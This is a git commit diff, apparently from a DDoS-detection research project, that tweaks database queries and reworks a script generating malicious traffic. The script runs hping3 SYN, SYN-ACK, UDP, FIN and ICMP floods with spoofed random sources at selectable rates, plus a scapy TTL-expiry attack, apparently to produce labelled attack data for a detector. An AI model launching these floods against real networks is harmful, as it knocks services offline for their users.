774aa86921dfda5f1d209be10476e3529ae9bc91
Maciej Wojtowicz <maciek.wojtowicz97@gmail.com>
2021-12-18 18:16:55 +0000

    Attack scenario preparation

--- utils/tag_data.py
+++ utils/tag_data.py
@@ -13,8 +13,8 @@ databases = {
 }
 
 QUERY_TIME_AGGREGATION = """select * from net order by time desc limit 1"""
-QUERY_ENTROPY = """select * from ddos_e order by time desc limit 515"""
-QUERY_METRICS = """select * from ddos_m order by time desc limit 515"""
+QUERY_ENTROPY = """select * from ddos_e order by time desc limit 100"""
+QUERY_METRICS = """select * from ddos_m order by time desc limit 500"""
 QUERY_BASE = """select count(length) as num_of_packet,mean(length) as size_of_data from net where time <= '' group by time(3s) order by time desc limit 10"""
 
 class MetricCollecter:
--- utils/traffic_gen/malicious_traffic.py
+++ utils/traffic_gen/malicious_traffic.py
@@ -4,28 +4,28 @@ import os
 import random
 from normal_traffic import networks
 
-attack = ["tcp_syn_ack","udp_flood","icmp_flood_frag","fin_flood","syn_flood","ttl_expiry"]
-
+attack = ["tcp_syn_ack","udp","icmp_frag","fin","syn","ttl_expiry"]
+packet_interval = ["fast","faster","flood"]
 
 def ttl_expiry_attack(net):
     p = scapy.IP(dst=random.choice(networks[net]),ttl = 2)/scapy.TCP(sport=80,dport=random.randint(1025,65534))
     scapy.send(p, inter = 0.01)
 
 def tuple_gen(network):
-    return random.randint(1025,65534),random.randint(80,1000),network
+    return random.randint(1025,65534),random.randint(80,1000),random.choice(networks[network])
 
-def attack_check(type,network):
+def attack_check(type,network,speed):
 
     if type == "tcp_syn_ack":
-        os.system("sudo hping3 --syn --ack --rand-source --fast -p {0[0]} -d {0[1]} {0[2]}".format(tuple_gen(network)))
-    elif type == "udp_flood":
-        os.system("sudo hping3 --udp --rand-source --fast -p {0[0]} -d {0[1]} {0[2]}".format(tuple_gen(network)))
-    elif type == "icmp_flood_frag":
+        os.system("sudo hping3 --syn --ack --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
+    elif type == "udp":
+        os.system("sudo hping3 --udp --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
+    elif type == "icmp_frag":
         os.system("sudo hping3 -1 -d 10000 -i u10 " + network)
-    elif type == "fin_flood":
-        os.system("sudo hping3 --fin --rand-source --fast -p {0[0]} -d {0[1]} {0[2]}".format(tuple_gen(network)))
-    elif type == "syn_flood":
-        os.system("sudo hping3 --syn --rand-source --fast -p {0[0]} -d {0[1]} {0[2]}".format(tuple_gen(network)))
+    elif type == "fin":
+        os.system("sudo hping3 --fin --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
+    elif type == "syn":
+        os.system("sudo hping3 --syn --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
     elif type == "ttl_expiry":
         ttl_expiry_attack(network)
 
@@ -35,15 +35,11 @@ if __name__ == "__main__":
 
     try: 
         attack_type = sys.argv[1]
+        speed = sys.argv[2]
+        network = sys.argv[3]
     except IndexError as e:
-        print("Attack type not provided: {}".format(e))
+        print("Not all parameters provided: {}".format(e))
     
-    try:
-        network = sys.argv[2]
-    except IndexError as e:
-        print("Network address not provided: {}".format(e))
-
-
-    if attack_type in attack:
-        attack_check(attack_type,network)
+    if speed in packet_interval and attack_type in attack:
+        attack_check(attack_type,network,speed)
         
